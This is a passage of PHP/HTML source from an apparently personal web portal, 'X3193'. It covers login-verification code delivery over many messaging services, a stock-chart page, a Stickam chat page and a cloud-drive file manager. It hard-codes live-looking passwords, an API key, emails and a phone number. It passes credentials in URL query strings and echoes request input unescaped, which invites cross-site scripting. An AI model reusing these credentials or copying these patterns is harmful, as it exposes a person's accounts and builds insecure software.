                                   //mail('xcy6272003@126.com','X3193验证您的访问权限失败','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'],"From: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" . "Reply-To: X3193<x3193@0318e.x3193.cu.cc>" . "\r\n" .'X-Mailer: PHP/' . phpversion());
                  $html = new mail_class();
                  $html->html_mail('X3193<x3193@0318e.x3193.cu.cc>','xcy6272003@126.com', 'X3193验证您的访问权限失败', '本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['EMAIL'].', and the IP is :'.$_SERVER['SERVER_NAME'],'gb2312');
                                  
            }
      			elseif (strtolower(trim(request('verify'))) == 'sendcloud'){
      $url = 'http://sendcloud.sohu.com/webapi/mail.send.json';
      //不同于登录SendCloud站点的帐号，您需要登录后台创建发信子帐号，使用子帐号和密码才可以进行邮件的发送。
      $param = array('api_user' => 'x3193_tk',
              'api_key' => '4tGTE5IWEArQMoVA',
              'from' => 'x3193@x3193.tk',
              'fromname' => 'x3193.tk',
              'to' => 'xcy6272003@126.com',
              'subject' => iconv('gb2312','utf-8','X3193验证您的访问权限失败'),
              'html' => iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']));
      $options = array('http' => array('method'  => 'POST','content' => http_build_query($param)));
      $context  = stream_context_create($options);
      $result = file_get_contents($url, false, $context);
      //return $result;
  	  			}             
            elseif (strtolower(trim(request('verify'))) == 'msn'){
            }   
            elseif (strtolower(trim(request('verify'))) == 'jabber' || strtolower(trim(request('verify'))) == 'gtalk'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','x3193@g.x3193.cz.cc','gtalk','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'yahoo'){
               $imified = new imified_class();
                         $sendmsn = $imified->imifiedsendmsg('xcy6272003@126.com','EUIfgwe7','xcy6272003@yahoo.com','yahoo','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            }   
            elseif (strtolower(trim(request('verify'))) == 'xmpp'){
               $conn = new XMPPHP_XMPP('talk.google.com', 5222, 'xcy6272003@gmail.com', 'EUIfgwe7a', 'xmpphp', 'gmail.com', $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);
                   $conn->connect();
                   $conn->processUntil('session_start');
                   $conn->presence();
                   $conn->message('x3913@g.x3193.cz.cc', iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
                   $conn->disconnect();
            } 
      			elseif (strtolower(trim(request('verify'))) == 'msn'){
								$sendMsg = new sendMsg();
								$sendMsg->simpleSend('x3193@live.com', 'EUIfgwe7', 'x3193@x3193.tk',iconv('gb2312','utf-8','本次登陆验证失败！请重新验证！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));
								//echo $sendMsg->result.' '.$sendMsg->error;
      			}    
      			elseif (strtolower(trim(request('verify'))) == 'smtp'){
							$smtp = new smtp('smtp.x3193.tk','25',true,'x3193@x3193.tk','EUIfgwe7');
        			$smtp->sendmail('merujxitcddevjhgg@x3193.tk','x3193.tk', 'x3193@x3193.tk','x3193@x3193.tk', iconv('gb2312','gb2312','本次登陆验证失败！'), iconv('gb2312','gb2312','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']), 'txt', '', '', '','600');
     				}      			           
            elseif (strtolower(trim(request('verify'))) == 'gcal'){
                    	$google_calendar = new google_class();
                    	$AuthClientLogin = $google_calendar->googleauthclientlogin(trim(base64_encode('xcy6272003@gmail.com')),trim(base64_encode('EUIfgwe7a')),trim('calendar'));
               		$google_calendar->googlecalendarsendsms($AuthClientLogin,trim('本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]),trim('X3193登录验证'),trim('X3193登录验证模块'));
            }
            elseif (strtolower(trim(request('verify'))) == 'voxeo'){
               //$voxeo = new imified_class();
               //$voxeo->voxeosendsms('x3193','EUIfgwe7','+8615998963077','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
            		$voxeo = new voxeo_class();
                $voxeo->voxeosendsms('+8615998963077','Sorry! The verification code is：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
                
            }   
        		elseif (strtolower(trim(request('verify'))) == 'fetion'){
							$fetion = new fetion_class();	// 手机号、飞信密码
							$fetion->sendmsg('',iconv('gb2312','utf-8','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
         			
							//$fetion = new PHPFetion('15998963077', 'EUIfgwe7');	// 手机号、飞信密码
							//$fetion->send('15998963077', iconv('gb2312','utf-8','本次登陆验证失败！本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]));	// 接收人手机号、飞信内容      	
      	
   					 //$voxeo = new voxeo_class();
             //$voxeo->voxeosendsms('x3193','EUIfgwe7','8615998963077','本次验证码为：'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);
      			}           
                        }
                         
         					 ($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['PC']);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify'][strtoupper(trim(request('verify')))]);
                   unset($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['MSG']);                   
              		 			//echo trim($_SERVER["SERVER_NAME"]).' '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' 1111 '.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
              		 			//exit;
         				if (is_wap()){
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);
                   			}else{
                   				redirect($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['url']);                   			
                   			}                        
                }
}
exit;
} // idoll function end
?>

<?php 
function stock_10jqka(){ // idoll function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 股票");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="120%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" height="89%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="top" style="border:0">
                <td align="top" id="Picnik">
                <script language="JavaScript" type="text/javascript">
                        document.getElementById('Picnik').innerHTML = '<iframe src="http://www.10jqka.com.cn/flash/" id="10jqka" name="10jqka" quality="high" allowscriptaccess="always" allowfullscreen="true" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="100%" height="100%" frameborder="0" />';
                </script>
                </td>
        </tr>
</table>
<?php 
$style->footer();
exit;
} // idoll function end
?>

<?php 
function stickam(){
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 会议");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left">
                        <script src="http://www.stickam.tv/js/ObjectControl.js"></script>
                        <script src="http://www.stickam.tv/js/one2one.js"></script>
                        <script language="javascript" type="text/javascript"> 
			function fullScreen(){
				window.moveTo(0,0);
				window.resizeTo(screen.width,screen.height-30);
			}
			function hideWarning(){
				document.getElementById('warningText').style.display="none";
			}
			</script>
                        <div align='center' width='100%' height='100%'>
                        <noscript>
                        	<SCRIPT>startChatRoom('955','675','chat_room','http://player.stickam.tv/flash/stickam/stickam_player.swf?app=stickam_chat_room.swf','userID=200000721441&userType=205&sessionType=115&langID=cn&webID=x3193:200000721441:123.144.2.82:1304242826:23d2e5e387928ce735785dcaf1f5a64c&skinName=room&skinType=room&ban=0&userIP=123.144.2.82&userName=x3193&hostName=http://www.stickam.tv&roomId=64705&roomName=X3193&password=&requirePassword=0','','','')</SCRIPT>
                        </noscript>
			<script>startChatRoom('900','630','chat_room','http://player.stickam.tv/flash/stickam/stickam_player.swf?app=stickam_chat_room.swf','userID=200000721441&userType=205&sessionType=115&langID=cn&webID=x3193:200000721441:123.144.4.160:1319951758:173b586b406c97b8ad8fe2b78e7d18d1&skinName=room&skinType=room&ban=0&userIP=123.144.4.160&userName=x3193&hostName=http://www.stickam.tv&roomId=71239&roomName=X3193%E8%81%8A%E5%A4%A9&password=&requirePassword=1','','','')</script>
			<script type="text/javascript"> 
			setTimeout("hideWarning()", 10000);
			</script>
                        </div>
                </td>
        </tr>   
</table>
<?php 
$style->footer();
exit;
}
?>      

<?php 
function vdisk(){
header('Content-Type: text/html; charset=gb2312');


?>
<head>
<?php 
$style = new css();
$style->ico();
switch (trim(request('api'))) {  // case start
        case "vdisk":
                $style->title("X3193 - 网盘");
        	break;       	
}
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
} 

$tag = New TagAction(); 

switch (trim(request('action'))) {  // case start
    	case "vdisk":
                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=".trim(request("api"))."&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("vdisk");
}                        

                        $_SESSION["vdisk"]["uname"] = "";      
                        $_SESSION["vdisk"]["pwd"] = "";        
                        redirect(scriptpath()."?api=vdisk&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["vdisk"]["uname"] != "" && $_SESSION["vdisk"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=vdisk&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["vdisk"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["vdisk"]["pwd"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }       
                elseif (trim(request('uname')) != "" && trim(request('pwd')) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("vdisk");
} 
                        $_SESSION["vdisk"]["uname"] = trim(request("uname"));  
                        $_SESSION["vdisk"]["pwd"] = trim(request("pwd"));      
     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = trim(request("authclientLogin"));
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=calendar&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }       
                
                $vdisk = new vdisk_class();
		$contents = $vdisk->vdisklogin($page,$pagesize,base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))),trim(request('dirid'))==''?'0':trim(request('dirid')));
		//print_r($contents);
		//return;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.vdisk.chidd'+i))
 {
  eval('document.vdisk.chidd'+i).checked = document.vdisk.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.vdisk.action='<?php echo httppath()."?api=vdisk&skin=".$skincolor."&dirid=".encodeuri(trim(request("dirid")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("vdisk.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.vdisk.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=vdisk&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=vdisk&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="vdisk" method="post" action="">
        <tr class="tdtbg">
                <td align="center">空 间 管 理</td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">&nbsp;文件管理 -> <a href="<?php echo httppath()."?api=vdisk&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("vdisk")."&dirname=".encodeuri("")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;"><?php echo base64_decode(trim(request("uname")))?></a> -> <?php echo trim(request('dirname'))==''?'根目录':".".trim(request('dirname'));?></td>
        </tr>
</table>
                <?php 
                        if (count($contents['data']) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents['data']);
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <?php 
                        ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="7%">类型</td>
                                <td align="center">名称</td>
                                <td align="center" width="15%">修改时间</td>
                                <td align="center" width="25%"><a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.new")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">新建</a> <a href="<?php echo httppath()."?api=ftp"."&skin=".$skincolor."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.upload")."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000;">上传</a> <a style="color:#000000" href="javascript:delitem();">删除</a> 压缩 解压</td>
                        </tr>
                        <?php 
                        $cMaxDir = 0;
                        $cMaxFile = 0;
                        ?>
                        <?php 
			if(count($contents['data'])>'0'){
                        foreach ($contents['data'] as $current){ 
                                //ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($current['type']=="dir"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $split[8];?>" /></td>
                                <td align="center">目录</td>

                                        <td align="left">&nbsp;<a href="<?php echo httppath()."?api=vdisk&skin=".$skincolor."&dirname=".encodeuri(trim(request("dirname"))==""?iconv('utf-8','gb2312',$current['dirname']):trim(request("dirname"))."/".iconv('utf-8','gb2312',$current['dirname']))."&dirid=".trim($current['dirid'])."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000"><?php echo iconv('utf-8','gb2312',$current['dirname']);?></a></td>

                                <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
                                <td align="center"><a href="javascript:renamed('<?php echo $split[8];?>');" style="color:#000000">改名</a> <a href="<?php echo httppath()."?api=vdisk&skin=".$skincolor."&id=".encodeuri(trim($current['dirid']))."&dirid=".encodeuri(trim(request("dirid"))==''?0:trim(request("dirid")))."&dirname=".encodeuri(iconv('utf-8','gb2312',$current['dirname']))."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("vdisk.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">删除</a> <a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&dirname=".encodeuri($split[8])."&type=".encodeuri("dir")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.view")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">列表</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxDir = $cMaxDir + 1;
                                }
                                unset($current);
                                unset($split);
                        }

                        $cMaxFile = $cMaxDir;
                        foreach ($contents['data'] as $current){ 
                                //ereg("([0-9]{2})-([0-9]{2})-([0-9]{2}) +([0-9]{2}):([0-9]{2})(AM|PM) +([0-9]+|<DIR>) +(.+)",$current,$split);
                                if ($current['type']=="file"){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxFile;?>" id="chidd<?php echo $cMaxFile;?>" value="<?php echo $split[8];?>"></td>
                                <td align="center">文件</td>
                                <td align="left">&nbsp;<a href="<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=o&filename=".encodeuri($split[8])."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.download")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000"><?php echo iconv('utf-8','gb2312',$current['filename']);?></a></td>
                                <td align="center"><?php echo $split[1]."-".$split[2]."-".$split[3]." ".$split[4].":".$split[5].$split[6];?></td>
                                <td align="center"><a href="javascript:rename('<?php echo $split[8];?>');" style="color:#000000">改名</a> <a href="<?php echo httppath()."?api=vdisk&skin=".$skincolor."&id=".encodeuri(trim($current['fileid']))."&dirid=".encodeuri(trim(request("dirid"))==''?0:trim(request("dirid")))."&filename=".encodeuri(iconv('utf-8','gb2312',$current['filename']))."&type=".encodeuri("file")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("vdisk.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>" style="color:#000000">删除</a> 压缩</td>
                        </tr>
                        <?php 
                                        $cMaxFile = $cMaxFile + 1;
                                }
                                unset($current);
                                unset($split);
                        }
                	}
                	else{
               	
                	}
                        ?>
                </table>
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                        <tr class="tdbg"> 
                                <td height="21" colspan="5" align="center">
                                        共 <?php echo $cMaxDir;?> 个目录，<?php echo ($cMaxFile-$cMaxDir);?> 个文件 
                                </td>
                        </tr>
                </table>

         </td>
     </tr>
</form>
</table>        
                <?php  		
                break;
        case "vdisk.remove":
                //print_r($_POST);
                //return;
                if (trim(request("delok")) == "1"){
                }
                else{
                	if(is_wap()){
                ?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											<a hreF='#' onclick='window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";'>确认</a>
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>取消</a>
                </td>
        </tr>  
</table> 
				<?php 
                        break;
									}
									else{
				?>
        <script language="javascript">
                if(confirm('确定删除选中的<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>?') == true){
                        window.location.href="<?php echo httpPath()."?".$_SERVER['QUERY_STRING'];?>&delok=1";
                }       
                else{   
                        alert("该<?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除取消！");
                        history.go(-1);
                }       
        </script>
                <?php 
                        break;
                     }
                }
                $vdisk = new vdisk_class();
                $vdiskremove = $vdisk->vdiskallremove(base64_decode(trim($_SESSION["vdisk"]["uname"])),base64_decode(trim($_SESSION["vdisk"]["pwd"])),trim(request("type")),trim(request("id")),$_POST);
                //print_r($vdiskremove);
                //return;
                if($accountremove['xmlcode'] == '-1' && $accountremove['msg'] == "sorry"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        <?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除失败！原因：“未选择任何条目！”<?php  echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php       
                }       
                elseif ($vdiskremove['err_code'] == '0' && $vdiskremove['err_msg'] == "success"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        <?php if(trim(request("type"))=='file'){echo '文件';}elseif(trim(request("type"))=='dir'){echo '目录';}?>删除成功！<?php  echo $timeout/1000?> 秒后返回上一页                
                </td>
        </tr>   
                <?php 
                        if (count($_POST)==0)
                                echo "<p align=center><script>window.setTimeout(\"history.go(-2)\",".$timeout.");</script></p>";
                        else                            
                                echo "<p align=center><script>window.setTimeout(\"history.go(-1)\",".$timeout.");</script></p>";
                ?>
</table>                        
                <?php 
                }                       
                elseif ($vdiskremove['err_code'] != '0' || $vdiskremove['err_msg'] != "success"){
                        $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
